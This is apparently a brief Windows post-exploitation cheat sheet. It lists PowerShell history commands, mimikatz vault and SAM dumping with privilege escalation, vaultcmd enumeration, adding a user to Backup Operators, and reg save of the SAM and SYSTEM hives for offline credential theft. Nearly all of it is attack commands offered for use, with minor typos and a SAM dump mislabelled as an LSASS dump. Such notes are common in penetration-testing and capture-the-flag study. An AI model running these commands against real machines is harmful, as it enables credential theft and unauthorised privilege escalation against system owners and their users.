

```
Get-History 

#history path
(Get-PSReadLineOption).HistorySavePath

#used to keep track of execute commands
Start-Transcript  -Path "C:\Users\USER\Desktop\Log.txt"

```

  Dump vault with mimikatz
```
mimikatz.exe vault::list
```


  Enumerate vaults
```
vaultcmd /list
```

To Dump the Sam  we can either  use
- Mimikatz to dump LSASS process 

```
mimikatz64.exe "privilege:debug" "token:elevate" "lsadump::sam" "exit"

```

- If we have the seBackupPrivilege
```sh
#assign a memeber
Add-LocalGroupMember -Group "Backup Operators" -Member "Noob"
# Find SAM and  SYSTEM 
```


```
reg save hklm\sam C:\Users\Noob\DEsktiop
reg save hklm\system C:\Users\Noob\DEsktiop

```


